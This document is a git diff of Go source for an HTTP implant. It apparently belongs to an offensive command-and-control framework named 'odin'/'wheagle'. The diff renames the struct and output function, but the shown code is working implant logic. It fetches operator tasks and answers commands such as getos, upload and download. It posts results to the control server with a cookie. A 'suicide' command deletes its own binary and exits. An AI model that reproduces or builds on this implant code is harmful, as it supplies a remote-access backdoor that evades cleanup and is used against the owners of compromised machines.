@@ -14,22 +14,12 @@ import(
   "crypto/tls"
   "io/ioutil"
   "crypto/x509"
-  "odin/lib/c2"
-  "odin/lib/utils"
-  "odin/lib/penguins/zoo"
-  "odin/wheagle/server/grpcapi"
+  "github.com/alphamystic/odin/lib/utils"
+  "github.com/alphamystic/odin/lib/penguins/zoo"
+  "github.com/alphamystic/odin/wheagle/server/grpcapi"
 )
 
-type ImplantWrapper struct{
-  Address string
-  MothershipID string
-  MotherShips []string
-  ISession *c2.Session
-  Tls bool
-  RootPem []byte
-}
-
-func (iw *ImplantWrapper) RunHTTPImplant(){
+func (iw *Implant) RunHTTPImplant(){
   //create a http/https cient
   var (
     err error
@@ -109,7 +99,7 @@ func (iw *ImplantWrapper) RunHTTPImplant(){
   case "getos":
     output = runtime.GOOS
     work.Out += output
-    iw.SendOutput(cookie,outUrl,work)
+    iw.HTTPSendOutput(cookie,outUrl,work)
     goto START
   case "upload":
   case "download":
@@ -140,18 +130,18 @@ func (iw *ImplantWrapper) RunHTTPImplant(){
   case "suicide":
     output = "Initiating kill chain..........."
     work.Out += output
-    iw.SendOutput(cookie,outUrl,work)
+    iw.HTTPSendOutput(cookie,outUrl,work)
     _ = os.Remove(os.Args[0])
     os.Exit(0)
   default:
     work.Out += output
-    iw.SendOutput(cookie,outUrl,work)
+    iw.HTTPSendOutput(cookie,outUrl,work)
     goto START
   }
 }
 
 // does not return that way if the post request/encoding fais the work still remains in the pool.
-func (iw *ImplantWrapper) SendOutput(cookie, outUrl string, cmd *grpcapi.Command) {
+func (iw *Implant) HTTPSendOutput(cookie, outUrl string, cmd *grpcapi.Command) {
 	data, err := grpcapi.WorkEncode(cmd)
 	if err != nil {
 		return
